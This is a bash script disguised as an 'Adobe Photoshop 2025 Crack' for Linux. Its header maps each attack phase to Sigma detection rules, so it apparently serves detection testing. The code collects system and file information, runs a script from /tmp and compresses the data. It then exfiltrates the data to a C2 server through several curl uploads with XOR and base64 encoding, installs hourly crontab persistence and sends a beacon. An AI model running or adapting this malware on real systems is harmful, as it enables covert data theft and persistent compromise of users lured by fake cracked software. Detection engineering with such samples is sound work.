#!/bin/bash
# ============================================================
# Adobe Photoshop 2025 Crack - Linux Version
# FULL ATTACK CHAIN: Discovery -> Collection -> Exfiltration -> Persistence
# 
# === SIGMA DETECTION MAPPING ===
# Phase | Hành vi                          | Rule ID     | Rule Name                                
# ------|----------------------------------|-------------|-------------------------------------------
# 1     | System Information Discovery     | 42df45e7    | System Information Discovery             
# 2     | File & Directory Discovery       | d3feb4ee    | File and Directory Discovery - Linux     
# 3     | Script in Suspicious Directory   | 30bcce26    | Execution Of Script Located In /tmp      
# 4     | Data Compression                 | N/A         | tar/gzip usage                           
# 5     | C2 Exfiltration via Curl         | 00b90cc1    | Suspicious Curl File Upload - Linux      
# 6     | Persistence via Crontab          | N/A         | Crontab persistence                      
# ============================================================

set -e

# Configuration
RUN_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 8 | head -n 1)
C2_SERVER="http://192.168.10.105:8080"
EXFIL_ENDPOINT="/exfil"
PERSISTENCE_NAME="adobe_update"
STAGING_DIR="/tmp/.adobe_crack_$RUN_ID"
MARKER="PAYLOAD_LINUX_$RUN_ID"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GRAY='\033[0;90m'
NC='\033[0m' # No Color

# Create staging directory
mkdir -p "$STAGING_DIR"

# ============================================================
# Helper: Send data to C2 via curl
# ============================================================
send_to_c2() {
    local DATA_TYPE="$1"
    local DATA="$2"
    local PHASE_ID="$3"
    
    local PAYLOAD=$(cat <<EOF
{
    "victim_id": "$(hostname)",
    "username": "$(whoami)",
    "run_id": "$RUN_ID",
    "phase_id": "$PHASE_ID",
    "data_type": "$DATA_TYPE",
    "timestamp": "$(date '+%Y-%m-%d %H:%M:%S')",
    "content": $(echo "$DATA" | jq -Rs .)
}
EOF
)
    
    # XOR obfuscation (key=0x42)
    local ENCODED=$(echo "$PAYLOAD" | xxd -p | tr -d '\n' | while read -r hex; do
        for (( i=0; i<${#hex}; i+=2 )); do
            byte=${hex:$i:2}
            printf "%02x" $((0x$byte ^ 0x42))
        done
    done | xxd -r -p | base64 -w 0)
    
    # Send via curl (this will trigger Sigma rule 00b90cc1)
    curl -s -X POST "$C2_SERVER$EXFIL_ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "{\"data\":\"$ENCODED\"}" \
        --max-time 5 > /dev/null 2>&1
    
    echo -e "${GREEN}  [+] C2 sent: $DATA_TYPE${NC}"
}

# ============================================================
# PHASE 1 | System Information Discovery
# Sigma Rule: 42df45e7-... (System Information Discovery)
# ============================================================
PHASE1_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
echo -e "\n${CYAN}[PHASE 1] System Information Discovery...${NC}"
echo -e "${GRAY}  Sigma Rule: 42df45e7 - System Information Discovery${NC}"
echo -e "${GRAY}  Expected Detection: process.executable: */uname, */hostname, */lscpu, */lsmod${NC}"
echo -e "${GRAY}  RunId: $PHASE1_ID${NC}"

# Trigger Sigma rule 42df45e7 - these commands will be detected
echo -e "${YELLOW}  [*] Executing uname -a (system info)${NC}"
uname -a > "$STAGING_DIR/system_info.txt"

echo -e "${YELLOW}  [*] Executing hostname (hostname discovery)${NC}"
hostname >> "$STAGING_DIR/system_info.txt"

echo -e "${YELLOW}  [*] Executing lscpu (CPU info)${NC}"
lscpu >> "$STAGING_DIR/cpu_info.txt" 2>/dev/null || echo "lscpu not available"

echo -e "${YELLOW}  [*] Executing lsmod (kernel modules)${NC}"
lsmod >> "$STAGING_DIR/modules.txt" 2>/dev/null || echo "lsmod not available"

# Collect system info
cat > "$STAGING_DIR/system_info_$PHASE1_ID.json" <<EOF
{
    "phase": 1,
    "run_id": "$PHASE1_ID",
    "hostname": "$(hostname)",
    "user": "$(whoami)",
    "os": "$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)",
    "kernel": "$(uname -r)",
    "cpu": "$(lscpu 2>/dev/null | grep 'Model name' | head -1 | cut -d':' -f2 | xargs)"
}
EOF

echo -e "${GREEN}  [+] System information collected - Sigma rule 42df45e7 triggered${NC}"
sleep 2

# ============================================================
# PHASE 2 | File and Directory Discovery
# Sigma Rule: d3feb4ee-... (File and Directory Discovery - Linux)
# ============================================================
PHASE2_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
echo -e "\n${CYAN}[PHASE 2] File and Directory Discovery...${NC}"
echo -e "${GRAY}  Sigma Rule: d3feb4ee - File and Directory Discovery - Linux${NC}"
echo -e "${GRAY}  Expected Detection: process.executable: */find, */tree, */ls -R${NC}"
echo -e "${GRAY}  RunId: $PHASE2_ID${NC}"

# Trigger Sigma rule d3feb4ee
echo -e "${YELLOW}  [*] Executing find /home -type f (file discovery)${NC}"
find /home -type f 2>/dev/null | head -20 > "$STAGING_DIR/home_files.txt"

echo -e "${YELLOW}  [*] Executing ls -R (recursive directory listing)${NC}"
ls -R /tmp 2>/dev/null | head -30 > "$STAGING_DIR/tmp_files.txt"

# Collect directory structure
cat > "$STAGING_DIR/file_discovery_$PHASE2_ID.json" <<EOF
{
    "phase": 2,
    "run_id": "$PHASE2_ID",
    "home_files_count": $(find /home -type f 2>/dev/null | wc -l),
    "temp_files_count": $(find /tmp -type f 2>/dev/null | wc -l),
    "discovered_paths": ["/home", "/tmp", "/var/log"]
}
EOF

echo -e "${GREEN}  [+] File discovery completed - Sigma rule d3feb4ee triggered${NC}"
sleep 2

# ============================================================
# PHASE 3 | Script Execution from Suspicious Directory (/tmp)
# Sigma Rule: 30bcce26-... (Execution Of Script Located In Potentially Suspicious Directory)
# ============================================================
PHASE3_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
echo -e "\n${CYAN}[PHASE 3] Executing script from /tmp...${NC}"
echo -e "${GRAY}  Sigma Rule: 30bcce26 - Execution Of Script Located In Suspicious Directory${NC}"
echo -e "${GRAY}  Expected Detection: process.executable: */bash, process.command_line: */tmp/* -c${NC}"
echo -e "${GRAY}  RunId: $PHASE3_ID${NC}"

# Create a script in /tmp (suspicious location)
TMP_SCRIPT="/tmp/.system_update_$PHASE3_ID.sh"
cat > "$TMP_SCRIPT" <<'EOF'
#!/bin/bash
# This script will trigger Sigma rule 30bcce26
echo "[*] Running from /tmp directory"
hostname
whoami
date
EOF
chmod +x "$TMP_SCRIPT"

# Execute script from /tmp - this triggers Sigma rule 30bcce26
echo -e "${YELLOW}  [*] Executing script from /tmp (suspicious location)${NC}"
bash -c "$TMP_SCRIPT" > "$STAGING_DIR/script_output.txt" 2>&1

# Also demonstrate inline script execution from /tmp
echo -e "${YELLOW}  [*] Executing inline script with /tmp reference${NC}"
bash -c "echo 'Running from /tmp' > /tmp/test.txt && cat /tmp/test.txt" >> "$STAGING_DIR/script_output.txt"

# Collect execution info
cat > "$STAGING_DIR/script_exec_$PHASE3_ID.json" <<EOF
{
    "phase": 3,
    "run_id": "$PHASE3_ID",
    "script_path": "$TMP_SCRIPT",
    "execution_via": "bash -c",
    "output": "$(cat $STAGING_DIR/script_output.txt | head -5 | jq -Rs .)"
}
EOF

echo -e "${GREEN}  [+] Script executed from /tmp - Sigma rule 30bcce26 triggered${NC}"
sleep 2

# ============================================================
# PHASE 4 | Data Compression (Prepare for exfiltration)
# ============================================================
PHASE4_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
echo -e "\n${CYAN}[PHASE 4] Compressing collected data...${NC}"
echo -e "${GRAY}  (Data compression via tar/gzip)${NC}"
echo -e "${GRAY}  RunId: $PHASE4_ID${NC}"

# Compress all collected data - tar/gzip will be logged in auditd
echo -e "${YELLOW}  [*] Creating tar archive${NC}"
tar -czf "$STAGING_DIR/collected_data.tar.gz" -C "$STAGING_DIR" . 2>/dev/null

# Also show gzip compression
echo -e "${YELLOW}  [*] Gzip compression example${NC}"
gzip -k "$STAGING_DIR/system_info_$PHASE1_ID.json" 2>/dev/null || true

COMPRESSED_SIZE=$(du -h "$STAGING_DIR/collected_data.tar.gz" | cut -f1)
echo -e "${GREEN}  [+] Data compressed (Size: $COMPRESSED_SIZE)${NC}"
sleep 2

# ============================================================
# PHASE 5 | C2 Exfiltration via Curl
# Sigma Rule: 00b90cc1-... (Suspicious Curl File Upload - Linux)
# ============================================================
PHASE5_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
echo -e "\n${CYAN}[PHASE 5] Exfiltrating data via curl...${NC}"
echo -e "${GRAY}  Sigma Rule: 00b90cc1 - Suspicious Curl File Upload - Linux${NC}"
echo -e "${GRAY}  Expected Detection: curl --data, --form, --upload-file${NC}"
echo -e "${GRAY}  RunId: $PHASE5_ID${NC}"

# Encode data for exfiltration
DATA_B64=$(base64 -w 0 "$STAGING_DIR/collected_data.tar.gz" 2>/dev/null)

# === MULTIPLE CURL METHODS TO TRIGGER RULE ===

# Method 1: curl --data (POST with data) - triggers rule
echo -e "${YELLOW}  [*] curl --data (POST with data)${NC}"
curl -s -X POST "$C2_SERVER$EXFIL_ENDPOINT" \
    --data "run_id=$RUN_ID&data=$DATA_B64" \
    --max-time 5 > /dev/null 2>&1

# Method 2: curl --upload-file (PUT with file) - triggers rule
echo -e "${YELLOW}  [*] curl --upload-file (PUT file upload)${NC}"
curl -s --upload-file "$STAGING_DIR/collected_data.tar.gz" \
    "$C2_SERVER/uploads/$RUN_ID.tar.gz" \
    --max-time 5 > /dev/null 2>&1

# Method 3: curl --form (multipart form upload) - triggers rule
echo -e "${YELLOW}  [*] curl --form (multipart form)${NC}"
curl -s -X POST "$C2_SERVER$EXFIL_ENDPOINT" \
    --form "run_id=$RUN_ID" \
    --form "file=@$STAGING_DIR/collected_data.tar.gz" \
    --max-time 5 > /dev/null 2>&1

# Method 4: curl -d (short form of --data) - triggers rule
echo -e "${YELLOW}  [*] curl -d (POST data short form)${NC}"
curl -s -d "status=completed&run_id=$RUN_ID" \
    "$C2_SERVER/status" \
    --max-time 5 > /dev/null 2>&1

# Send final confirmation via send_to_c2 function (also uses curl)
send_to_c2 "exfil_complete" "Data sent successfully" "$PHASE5_ID"

echo -e "${GREEN}  [+] Multiple curl exfiltration methods executed - Sigma rule 00b90cc1 triggered${NC}"
sleep 2

# ============================================================
# PHASE 6 | Persistence via Crontab
# ============================================================
PHASE6_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
echo -e "\n${CYAN}[PHASE 6] Installing persistence via crontab...${NC}"
echo -e "${GRAY}  (Crontab persistence - re-run payload every hour)${NC}"
echo -e "${GRAY}  RunId: $PHASE6_ID${NC}"

# Copy current script to persistent location
PERSISTENT_PATH="/home/$(whoami)/.$PERSISTENCE_NAME.sh"
cp "$0" "$PERSISTENT_PATH" 2>/dev/null || cp "$(readlink -f $0)" "$PERSISTENT_PATH" 2>/dev/null
chmod +x "$PERSISTENT_PATH"

# Add to crontab (persistence)
CRON_JOB="0 * * * * $PERSISTENT_PATH --run-id $RUN_ID > /dev/null 2>&1"
(crontab -l 2>/dev/null | grep -v "$PERSISTENCE_NAME"; echo "$CRON_JOB") | crontab -

echo -e "${GREEN}  [+] Persistence installed via crontab${NC}"
sleep 2

# ============================================================
# CLEANUP (keep persistence)
# ============================================================
echo -e "\n${GRAY}Cleaning up temporary files...${NC}"
rm -f "/tmp/.system_update_$PHASE3_ID.sh"
rm -f "/tmp/test.txt"

# Keep staging dir for C2, will be cleaned later
# rm -rf "$STAGING_DIR"

echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  ✅ LINUX FULL ATTACK CHAIN COMPLETED                      ║${NC}"
echo -e "${GREEN}║  Victim: $(hostname)@$(whoami)${NC}"
echo -e "${GREEN}║  Run ID: $RUN_ID${NC}"
echo -e "${GREEN}║  Persistence: Crontab ($PERSISTENT_PATH)${NC}"
echo -e "${GREEN}║  C2 Server: $C2_SERVER${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Final beacon
curl -s "$C2_SERVER/beacon?client=$(hostname)&runid=$RUN_ID&status=complete" --max-time 3 > /dev/null 2>&1